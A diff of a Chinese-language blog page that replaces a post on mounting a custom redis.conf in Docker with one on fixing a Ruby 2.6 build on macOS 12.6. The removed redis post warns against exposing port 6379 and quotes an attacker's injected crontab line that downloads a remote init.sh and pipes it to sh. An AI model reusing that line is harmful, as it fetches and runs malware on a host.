@@ -4,23 +4,23 @@
 <head prefix="og: http://ogp.me/ns#">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-  <meta property="og:title" content="在 docker 中設定自定義的 redis config &middot; 社畜人生" />
+  <meta property="og:title" content="在 mac os 12.6 上安裝 ruby 2.6 &middot; 社畜人生" />
   
   <meta property="og:site_name" content="社畜人生" />
-  <meta property="og:url" content="http://shachiku.life/2022/09/docker-custom-alpine-redis-conf/" />
+  <meta property="og:url" content="http://shachiku.life/2022/10/macos12.6_install_ruby2.6/" />
   <meta name="description" content="雜談與紀錄" />
   
   
   <meta property="og:type" content="article" />
   
-  <meta property="og:article:published_time" content="2022-09-07T11:11:54&#43;08:00" />
+  <meta property="og:article:published_time" content="2022-10-07T10:08:47&#43;08:00" />
   
-  <meta property="og:article:tag" content="docker" />
+  <meta property="og:article:tag" content="ruby" />
   
   
 
   <title>
-     在 docker 中設定自定義的 redis config &middot;  社畜人生
+     在 mac os 12.6 上安裝 ruby 2.6 &middot;  社畜人生
   </title>
   <link rel="alternative stylesheet" href="http://shachiku.life/css/bootstrap.min.css" />
   <link rel="stylesheet" href="http://shachiku.life/css/font-awesome.min.css" />
@@ -101,7 +101,7 @@
 <article>
   
   <header class="article-title">
-    <h1 class="text-primary">在 docker 中設定自定義的 redis config</h1>
+    <h1 class="text-primary">在 mac os 12.6 上安裝 ruby 2.6</h1>
   </header>
   <div class="delimiter"></div>
   
@@ -114,61 +114,55 @@
   </figure>
   
   <section>
-    <p>使用 alpine 時要特別注意設定檔有沒有被砍掉</p>
-<p>從官方看他的 <a href="https://hub.docker.com/layers/library/redis/latest/images/sha256-e96c03a6dda7d0f28e2de632048a3d34bb1636d0858b65ef9a554441c70f6633?context=explore">tag</a> 可以看出有進行移除的行為</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/bin/sh -c set -eux;
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
-</span></span><span style="display:flex;"><span>mkdir -p /usr/src/redis;
-</span></span><span style="display:flex;"><span>tar -xzf redis.tar.gz -C /usr/src/redis --strip-components<span style="color:#f92672">=</span>1;
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
-</span></span><span style="display:flex;"><span>rm -r /usr/src/redis;
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...end</span>
-</span></span></code></pre></div><h2 id="redisconf">redis.conf</h2>
-<pre tabindex="0"><code class="language-conf" data-lang="conf">dir /data; 預設 /etc 無權限
-</code></pre><h2 id="yaml">yaml</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;3&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">redis</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">redis:7.0.4-alpine</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
-</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./redis.conf:/usr/local/etc/redis/redis.conf</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 所以要加上 command 指定掛進去的 redis.conf 才會生效</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: <span style="color:#ae81ff">redis-server /usr/local/etc/redis/redis.conf</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 或是用 cli 的方式處理</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#command: &gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#  redis-server --bind 127.0.0.1</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#  --appendonly no</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#  --save &#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#  --protected-mode yes</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
-</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">6379</span>:<span style="color:#ae81ff">6379</span>
-</span></span></code></pre></div><h1 id="資安">資安</h1>
-<p>假如是裝在 vps 上要記得避免 6379 對外出去，因為有人會去攻擊塞入 cache 執行 shell 指令，例如在 log 中看到</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Failed opening the RDB file root (in server root dir /etc/crontabs) for saving: Permission denied
-</span></span></code></pre></div><p>這種 log 時進入 <code>redis-cli</code> 會發現你的 db0 被塞了四個 key: backup4~backup1，內容是類似</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#e6db74">&#34;\n\n\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n&#34;</span>
-</span></span></code></pre></div><p>這種意圖修改 crontab 去執行 sh 的情況，具體設定如下</p>
-<pre tabindex="0"><code class="language-conf" data-lang="conf">bind 127.0.0.1
-protected-mode yes # 確保來源都是 loopback interface
-</code></pre>
+    <p>最近在寫 ruby，因為案子有切版本的需求就用了 <code>rbenv</code> 做不同版本環境切割</p>
+<p>沒想到切一切爛掉所以重罐整個環境，結果就炸了</p>
+<p>每次重灌時都跑出這種錯誤</p>
+<pre tabindex="0"><code>linking shared-library libruby.2.6.dylib
+Undefined symbols for architecture arm64:
+  &#34;__mh_execute_header&#34;, referenced from:
+      _rb_dump_backtrace_with_lines in addr2line.o
+ld: symbol(s) not found for architecture arm64
+clang: error: linker command failed with exit code 1 (use -v to see invocation)
+make: *** [libruby.2.6.dylib] Error 1
+make: *** Waiting for unfinished jobs....
+</code></pre><p>參考幾篇文章後發現問題出在 xcode command line tool 14.0 在編譯 ruby 2.6.x 時會有問題</p>
+<p>最後安裝 13.4 就搞定了，解法如下</p>
+<h1 id="solution">solution</h1>
+<ol>
+<li>
+<p>找出 command line tool 安裝路徑 <code>xcode-select -p</code></p>
+</li>
+<li>
+<p><code>sudo rm -rf /path/to/commandlinetool</code></p>
+</li>
+<li>
+<p>go to apple developer to download Command Line Tools for Xcode 13.4, <a href="https://download.developer.apple.com/Developer_Tools/Command_Line_Tools_for_Xcode_13.4/Command_Line_Tools_for_Xcode_13.4.dmg">link</a></p>
+</li>
+<li>
+<p>install</p>
+</li>
+</ol>
+<p>就搞定拉</p>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://github.com/asdf-vm/asdf-ruby/issues/301">https://github.com/asdf-vm/asdf-ruby/issues/301</a></li>
+<li><a href="https://www.rubyonmac.dev/how-to-install-ruby-on-macos-12-6-apple-silicon">https://www.rubyonmac.dev/how-to-install-ruby-on-macos-12-6-apple-silicon</a></li>
+</ul>
+
   </section>
   <div class="clearfix">
     
     <div class="post-date pull-left">
       <span class="small">
         發佈時間
-        2022-9-7
+        2022-10-7
       </span>
     </div>
     
     <div class="pull-right">
       
       
-      <span class="post-tag"><a href="http://shachiku.life/tags/docker/">#docker</a></span>
+      <span class="post-tag"><a href="http://shachiku.life/tags/ruby/">#ruby</a></span>
       
       
     </div>
@@ -188,16 +182,16 @@ protected-mode yes # 確保來源都是 loopback interface
     <div class="delimiter"></div>
     <div class="pager-container">
       
-      <a class="btn btn-primary btn-older-posts" href="http://shachiku.life/2022/09/setup-ssh-connection-on-postgresql-in-docker/">
+      <a class="btn btn-primary btn-older-posts" href="http://shachiku.life/2022/09/docker-custom-alpine-redis-conf/">
         <div>
           <span aria-hidden="true">&larr;</span>
         </div>
       </a>
       
       
-      <a class="btn btn-primary btn-newer-posts" href="http://shachiku.life/2022/10/macos12.6_install_ruby2.6/">
+      <a class="btn btn-primary btn-newer-posts disabled" href="#">
         <div>
-          <span aria-hidden="true">&rarr;</span>
+          <span aria-hidden="true">&#10006;</span>
         </div>
       </a>
       
